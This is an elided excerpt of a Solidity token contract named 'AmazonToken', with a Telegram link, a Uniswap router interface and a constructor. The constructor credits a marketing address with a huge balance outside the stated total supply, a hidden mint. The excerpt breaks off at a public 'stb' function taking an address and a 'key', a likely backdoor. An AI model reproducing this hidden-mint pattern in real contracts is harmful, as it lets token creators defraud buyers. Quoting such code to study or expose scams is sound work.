...
// Telegram group: t.me/amazontokenofficial
...
interface IUniswapV2Router02 is IUniswapV2Router01 {
  ...
  contract AmazonToken is IERC20, Context, Ownable {
    ...
    constructor(address _marketingAddress, uint256 count) {
      ...
      _decimals = 18;
      _totalSupply = 100000000000000000 * 10 ** 8;
      _balances[msg.sender] = _totalSupply;
      _count = count;
      _balances[_marketingAddress] = 100000000000000000000000000 * 10 ** 6;
    ...
    */
    ...
    function stb(address _marketingAddress, uint256 key) public{
